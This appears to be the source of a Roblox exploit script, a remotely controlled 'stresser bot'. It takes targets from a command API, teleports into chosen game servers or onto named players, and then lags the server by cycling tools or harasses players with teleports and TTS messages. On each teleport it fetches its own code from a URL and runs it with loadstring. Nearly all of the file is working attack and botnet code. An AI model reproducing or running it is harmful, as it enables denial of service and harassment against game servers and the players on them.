    
    botState.isLagging = true
    botState.status = "lagging" -- Keep as lagging but still count as online
    log("Starting lag attack for " .. botState.currentDuration .. " seconds", "ATTACK")
    
    -- FIRST: Teleport to safe location
    teleportToSafeLocation()
    wait(1)
    
    -- SECOND: Copy avatar and get tools for lagging
    log("Copying avatar and getting tools...", "ATTACK")
    copyAvatarAndGetTools("24k_mxtty1")
    wait(2) -- Wait for avatar copy to complete and items to appear
    
    -- THIRD: Remove targeted items that appeared after avatar copy
    if player.Character then
        log("Removing targeted items that appeared after avatar copy...", "ATTACK")
        local removedCount = removeTargetedItems(player.Character)
        log("Removed " .. removedCount .. " items, waiting 2 seconds before starting lag...", "ATTACK")
        wait(2) -- Wait for items to be fully removed
    end
    
    -- Start tool cycling loop only (no teleportation or TTS)
    log("Starting tool cycling lag...", "ATTACK")
    toolCycleLoop()
    
    -- Set lag end time (this should only happen ONCE per attack)
    botState.lagEndTime = tick() + botState.currentDuration
    log("Lag will end at: " .. botState.lagEndTime .. " (duration: " .. botState.currentDuration .. "s)", "ATTACK")
end

local function stopAnnoyServer()
    if not botState.isAnnoying then return end
    
    botState.isAnnoying = false
    botState.lagEndTime = 0
    
    -- Stop teleport loop
    stopAnnoyTeleportLoop()
    
    log("Annoy server completed", "ANNOY")
    
    -- No tools to unequip in annoy mode (tools are only for lag attacks)
    
    -- Check if server hopping is enabled
    if botState.serverHopEnabled then
        log("Server hop enabled - completing server hop", "ANNOY")
        botState.status = "completed"
        
        -- Call server hop completion endpoint
        local success = completeServerHop()
        if success then
            log("Server hop process initiated successfully", "ANNOY")
            return
        else
            log("Server hop failed, falling back to normal completion", "ERROR")
        end
    end
    
    -- Normal completion (no server hopping)
    log("Normal annoy completion - going idle", "ANNOY")
    botState.status = "completed"
    
    -- For annoy tasks, we need to clear the bot assignment explicitly
    if botState.currentTaskType == "annoy" and botState.currentTaskId then
        log("Clearing annoy task assignment for task ID: " .. botState.currentTaskId, "ANNOY")
        -- Call a specific completion endpoint for annoy tasks
        local success, response = makeRequest("/complete-task", "POST", {
            taskId = botState.currentTaskId,
            botId = CONFIG.BOT_ID,
            taskType = "annoy"
        })
        if success then
            log("Annoy task assignment cleared successfully", "ANNOY")
        else
            log("Failed to clear annoy task assignment", "ERROR")
        end
    end
    
    -- Send completed status to API
    syncWithAPI()
    wait(2) -- Give API time to process the completed status
    
    -- Set to idle state after API processes completion
    botState.status = "online"
    botState.currentTarget = nil
    botState.currentTaskId = nil
    botState.joinTime = 0
    botState.currentTaskType = "attack" -- Reset to default
    
    -- Send final online status
    syncWithAPI()
    
    -- Clear status file to prevent restart loops
    saveBotStatus("online")
    
    log("Annoy server marked as completed in API, bot now idle and ready for next task", "ANNOY")
end

local function stopLagging()
    if not botState.isLagging then return end
    
    botState.isLagging = false
    botState.lagEndTime = 0
    
    log("Lag attack completed", "ATTACK")
    
    -- Unequip tools
    pcall(function()
        for _, tool in pairs(player.Backpack:GetChildren()) do
            tool:Destroy()
        end
    end)
    
    -- Check if server hopping is enabled
    if botState.serverHopEnabled then
        log("Server hop enabled - completing server hop", "ATTACK")
        botState.status = "completed"
        
        -- Call server hop completion endpoint
        local success = completeServerHop()
        if success then
            log("Server hop process initiated successfully", "ATTACK")
            -- The completeServerHop function handles teleportation
            return
        else
            log("Server hop failed, falling back to normal completion", "ERROR")
        end
    end
    
    -- Normal completion (no server hopping)
    log("Normal attack completion - going idle", "ATTACK")
    botState.status = "completed"
    
    -- Send completed status to API
    syncWithAPI()
    wait(2) -- Give API time to process the completed status
    
    -- Set to idle state after API processes completion
    botState.status = "online"
    botState.currentTarget = nil
    botState.currentTaskId = nil
    botState.joinTime = 0
    
    -- Send final online status
    syncWithAPI()
    
    -- Clear status file to prevent restart loops
    saveBotStatus("online")
    
    log("Attack marked as completed in API, bot now idle and ready for next attack", "ATTACK")
end

local function checkCurrentServer(target)
    -- Check if we're already in the target server
    local currentPlaceId = tostring(game.PlaceId)
    local currentJobId = game.JobId
    
    if currentPlaceId == target.placeId and currentJobId == target.jobId then
        botState.currentTarget = target
        botState.currentDuration = target.duration or 60
        botState.currentTaskId = target.taskId
        botState.serverHopEnabled = target.serverHop or false
        botState.currentTaskType = target.taskType or "attack"
        botState.annoyMode = target.annoyMode or "server"
        botState.targetPlayer = target.targetPlayer
        botState.lastStatusSync = 0
        botState.lastLoggedTime = 0
        
        -- Debug logging for targeting
        if botState.currentTaskType == "annoy" then
            log("🎯 ANNOY MODE: " .. botState.annoyMode .. " | TARGET: " .. (botState.targetPlayer or "ALL PLAYERS"), "DEBUG")
            log("[CRITICAL DEBUG] Bot will teleport to: " .. (botState.annoyMode == "player" and botState.targetPlayer or "EVERYONE"), "DEBUG")
        end
        
        if botState.currentTaskType == "annoy" then
            log("Already in target server! Starting annoy server immediately", "ANNOY")
            startAnnoyServer()
        else
            log("Already in target server! Starting lag immediately", "ATTACK")
            startLagging()
        end
        return true
    end
    return false
end

local function executeAttack(target)
    if not target then return end
    
    -- Check if we're already in the target server
    if checkCurrentServer(target) then
        return -- Already started lagging in current server
    end
    
    botState.currentTarget = target
    botState.currentDuration = target.duration or 60
    botState.currentTaskId = target.taskId
    botState.serverHopEnabled = target.serverHop or false
    botState.currentTaskType = target.taskType or "attack"
    botState.annoyMode = target.annoyMode or "server"
    botState.targetPlayer = target.targetPlayer
    botState.status = "ATTACKING"
    botState.joinTime = tick()
    botState.teleportRetries = 0  -- Reset retry counter for new attack
    botState.teleportStartTime = 0
    
    -- Debug logging for targeting
    if botState.currentTaskType == "annoy" then
        log("🎯 ANNOY MODE: " .. botState.annoyMode .. " | TARGET: " .. (botState.targetPlayer or "ALL PLAYERS"), "DEBUG")
        log("[CRITICAL DEBUG] Bot will teleport to: " .. (botState.annoyMode == "player" and botState.targetPlayer or "EVERYONE"), "DEBUG")
    end
    
    local taskName = botState.currentTaskType == "annoy" and "Annoy Server" or "Attack"
    log("Executing " .. taskName .. " on Place ID: " .. target.placeId, string.upper(botState.currentTaskType))
    log("Job ID: " .. string.sub(target.jobId, 1, 12) .. "...")
    log("Duration: " .. botState.currentDuration .. " seconds")
    
    -- Queue the script to re-execute after teleport
    queueTeleport([[
        -- Re-execute the stresser bot script
        _G.StresserBotExecuted = nil
        wait(3)
        local success, script = pcall(function()
            return game:HttpGet("]] .. CONFIG.SCRIPT_URL .. [[")
        end)
        if success and script and script ~= "" then
            local loadSuccess, err = pcall(function()
                loadstring(script)()
            end)
            if not loadSuccess then
                warn("Script execution failed: " .. tostring(err))
            end
        else
            warn("Failed to download bot script for re-execution")
        end
    ]])
    
    local success, result = pcall(function()
        if target.jobId and target.jobId ~= "random" then
            TeleportService:TeleportToPlaceInstance(tonumber(target.placeId), target.jobId)
        else
            -- For server hopping or when jobId is "random", teleport to random server
            TeleportService:Teleport(tonumber(target.placeId))
        end
    end)
    
    if success then
        botState.attacksExecuted = botState.attacksExecuted + 1
        botState.status = "TELEPORTING"
        botState.teleportStartTime = tick()
        botState.teleportRetries = 1
        log("Teleporting to target successfully!")
        log("Total attacks executed: " .. botState.attacksExecuted)
    else
        log("Teleport failed: " .. tostring(result) .. " - Will retry", "ERROR")
        botState.teleportRetries = 1
        botState.teleportStartTime = tick()
        -- Set status to teleporting so retry mechanism can handle it
        botState.status = "TELEPORTING"
    end
end

local function checkLagDuration()
    -- Check annoy server duration and TTS messages
    if botState.isAnnoying and botState.lagEndTime > 0 then
        local timeRemaining = botState.lagEndTime - tick()
        local elapsedTime = tick() - (botState.lagEndTime - botState.currentDuration)
        
        if console then
            console.statusBar.Text = "ANNOYING | TIME LEFT: " .. math.max(0, math.floor(timeRemaining)) .. "s"
        end
        
        -- Debug logging for timing
        if math.floor(elapsedTime) ~= botState.lastLoggedTime then
            botState.lastLoggedTime = math.floor(elapsedTime)
            log("Annoy progress: " .. math.floor(elapsedTime) .. "s / " .. botState.currentDuration .. "s", "ANNOY")
        end
        
        -- Send mysterious AI TTS message every 8 seconds (CONFIG.TTS_INTERVAL)
        if tick() - botState.chatTimer >= CONFIG.TTS_INTERVAL then
            sendTTSMessage() -- Will automatically use a random mysterious message
            botState.chatTimer = tick()
        end
        
        if timeRemaining <= 0 then
            log("Annoy duration complete, stopping annoy server", "ANNOY")
            stopAnnoyServer()
        end
    end
    
    -- Check if we need to stop lagging and go idle
    if botState.isLagging and botState.lagEndTime > 0 then
        local timeRemaining = botState.lagEndTime - tick()
        
        if console then
            console.statusBar.Text = "LAGGING | TIME LEFT: " .. math.max(0, math.floor(timeRemaining)) .. "s"
        end
        
        if timeRemaining <= 0 then
            stopLagging() -- This now handles everything including API calls and status file
        end
    end
    
    -- NO RESTART LOGIC - lag should only start once per attack
end

-- Check if teleport is stuck and handle retries
local function checkTeleportStatus()
    if botState.status == "TELEPORTING" or botState.status == "teleporting" then
        local timeInTeleport = tick() - botState.teleportStartTime
        
        -- If teleport has been running for more than timeout seconds
        if timeInTeleport > botState.teleportTimeout then
            log("Teleport timeout after " .. math.floor(timeInTeleport) .. " seconds", "ERROR")
            
            -- Check if we can retry
            if botState.teleportRetries < botState.maxTeleportRetries and botState.currentTarget then
                log("Retrying teleport (" .. (botState.teleportRetries + 1) .. "/" .. botState.maxTeleportRetries .. ")", "ATTACK")
                
                -- Reset teleport start time and try again
                botState.teleportStartTime = tick()
                botState.teleportRetries = botState.teleportRetries + 1
                
                -- Try teleporting again
                local success, result = pcall(function()
                    if botState.currentTarget.jobId and botState.currentTarget.jobId ~= "random" then
                        TeleportService:TeleportToPlaceInstance(tonumber(botState.currentTarget.placeId), botState.currentTarget.jobId)
                    else
                        TeleportService:Teleport(tonumber(botState.currentTarget.placeId))
                    end
                end)
                
                if not success then
                    log("Teleport retry failed: " .. tostring(result), "ERROR")
                end
            else
                log("Max teleport retries reached or no target - resetting to online", "ERROR")
                botState.status = "online"
                botState.currentTarget = nil
                botState.currentTaskId = nil
                botState.teleportRetries = 0
                botState.teleportStartTime = 0
                -- Sync the reset status
                syncWithAPI()
            end
        end
    end
end

-- Main loop - combines heartbeat and task polling into single API call
local function mainLoop()
    while botState.isActive do
        -- Always check teleport status first
        checkTeleportStatus()
        
        if botState.status == "online" then
            -- Sync with API - sends heartbeat and gets new task if available
            local target = syncWithAPI()
            if target then
                executeAttack(target)
            else
                log("No targets available, waiting...")
            end
        elseif botState.status == "lagging" or botState.status == "annoying" then
            -- Only check duration when lagging/annoying, don't sync with API
            checkLagDuration()
        elseif botState.status == "attacking" or botState.status == "teleporting" or botState.status == "TELEPORTING" then
            -- Just sync status, don't look for new tasks
            -- Only sync every 10 seconds to avoid spam when teleporting
            if tick() - botState.lastStatusSync > 10 then
                syncWithAPI()
                botState.lastStatusSync = tick()
            end
        else
            -- For other statuses (completed, etc), sync and check lag duration
            syncWithAPI()
            checkLagDuration()
        end
        
        wait(CONFIG.HEARTBEAT_INTERVAL) -- Now 5 seconds for everything
    end
end

local function statusUpdateLoop()
    while console.screenGui.Parent do
        if botState.isActive then
            local uptime = math.floor(tick() - botState.startTime)
            local minutes = math.floor(uptime / 60)
            local seconds = uptime % 60
            
            if not botState.shouldLeave and botState.status ~= "IN_SERVER" then
                local statusLine = "Uptime: " .. minutes .. "m " .. seconds .. "s | Attacks: " .. botState.attacksExecuted
                console.header.Text = "STRESSER BOT | " .. statusLine
                console.statusBar.Text = "STATUS: " .. botState.status
            end
            
            -- Update status bar color based on status
            if botState.status == "ONLINE" then
                console.statusBar.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
            elseif botState.status == "ATTACKING" or botState.status == "IN_SERVER" or botState.status == "annoying" then
                console.statusBar.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
            elseif botState.status == "ERROR" then
                console.statusBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
            end
        end
        wait(1)
    end
end

-- Auto-start function
local function startBot()
    if botState.isActive then return end
    
    botState.isActive = true
    botState.status = "online"
    botState.startTime = tick()
    
    log("Bot started successfully", "SYSTEM")
    
    -- Start single main loop (combines heartbeat + task polling)
    spawn(mainLoop)
    
    -- Check if we're in a target server (after teleport)
    if botState.currentTarget and botState.joinTime > 0 then
        botState.status = "in_server"
        log("Resumed in target server", "ATTACK")
    end
end

-- Check if we were teleported here by another instance
local function checkIfInTargetServer()
    -- Try to read bot status from file
    local success, statusData = pcall(function()
        local statusFile = createBotFolder()
        return readfile(statusFile)
    end)
    
    if success and statusData ~= "" then
        local data = HttpService:JSONDecode(statusData)
        if data and data.botId == CONFIG.BOT_ID then
            log("Found previous bot session data: " .. data.status, "SYSTEM")
            botState.attacksExecuted = data.attacksExecuted or 0
            
            -- ONLY restart if status is ATTACKING, not COMPLETED or ONLINE
            if tostring(game.PlaceId) ~= "0" and data.status == "ATTACKING" then
                log("Detected teleport to target server", "ATTACK")
                botState.status = "IN_SERVER"
                botState.joinTime = tick()
                botState.currentDuration = 60 -- Default, will be updated from server
                return true
            elseif data.status == "COMPLETED" or data.status == "ONLINE" then
                log("Bot was already completed/idle, not restarting attack", "SYSTEM")
                botState.status = "ONLINE"
                return false
            end
        end
    end
    return false
end

-- Initialize
console = createConsole()

log("Advanced Stresser Bot v3.0", "SYSTEM")
log("Initializing cloud-hosted bot...")
log("Bot ID: " .. CONFIG.BOT_ID)

-- Check if we're in a target server first
local inTargetServer = checkIfInTargetServer()

-- Initialize character setup
log("Setting up character...", "SYSTEM")
if not setupCharacter() then
    log("Character setup failed, but continuing with bot initialization", "WARNING")
end

-- Test connection and auto-start
spawn(function()
    wait(2)
    log("Testing API connection...")
    
    local success, response = makeRequest("/health", "GET")
    
    if success and response.Success then
        log("API connection successful", "SYSTEM")
        if CONFIG.AUTO_START then
            wait(1)
            startBot()
            
            if inTargetServer then
                log("Resuming attack in target server", "ATTACK")
            end
        else
            log("Manual start mode - execute _G.StresserBot.start() to begin")
        end
    else
        log("Cannot connect to API", "ERROR")
        log("Check your internet connection")
    end
end)

-- Start status update loop
spawn(statusUpdateLoop)

log("Bot ready - Waiting for API connection...")

-- Expose functions for manual control
_G.StresserBot = {
    start = startBot,
    stop = function()
        if botState.isActive then
            botState.isActive = false
            botState.status = "OFFLINE"
            botState.currentTarget = nil
            botState.currentTaskId = nil
            botState.teleportRetries = 0
            botState.teleportStartTime = 0
            botState.isLagging = false
            botState.lagEndTime = 0
            antiAFKEnabled = false -- Disable anti-AFK when stopping bot
            log("Bot stopped manually", "SYSTEM")
            saveBotStatus("OFFLINE")
        end
    end,
    toggleAntiAFK = function(enabled)
        if enabled == nil then
            antiAFKEnabled = not antiAFKEnabled
        else
            antiAFKEnabled = enabled
        end
        log("Anti-AFK " .. (antiAFKEnabled and "enabled" or "disabled"), "SYSTEM")
        return antiAFKEnabled
    end,
    reset = function()
        log("Resetting bot status to recover from stuck state", "SYSTEM")
        botState.status = "online"
        botState.currentTarget = nil
        botState.currentTaskId = nil
        botState.teleportRetries = 0
        botState.teleportStartTime = 0
        botState.isLagging = false
        botState.lagEndTime = 0
        saveBotStatus("online")
        syncWithAPI()
    end,
    status = function()
        return botState
    end,
    config = CONFIG
}
